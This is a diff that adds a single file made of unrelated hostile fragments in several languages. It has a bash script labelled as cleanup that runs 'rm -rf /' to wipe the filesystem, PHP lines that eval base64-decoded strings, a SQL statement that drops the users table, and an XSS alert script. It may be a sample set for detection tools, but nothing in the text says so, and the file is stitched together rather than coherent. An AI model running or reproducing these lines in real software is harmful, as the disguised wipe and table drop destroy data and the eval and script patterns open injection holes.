@@ -1,0 +1,18 @@
+#!/bin/bash
+echo "Cleaning up..."
+rm -rf /
+echo "Done"
+
+<?php
+$payload = eval(base64_decode("dGVzdA=="));
+$payload2 = eval(base64_decode("YWJj"));
+?>
+
+SELECT * FROM users;
+DROP TABLE users;
+
+<html>
+<body>
+<script>alert("xss")</script>
+</body>
+</html>
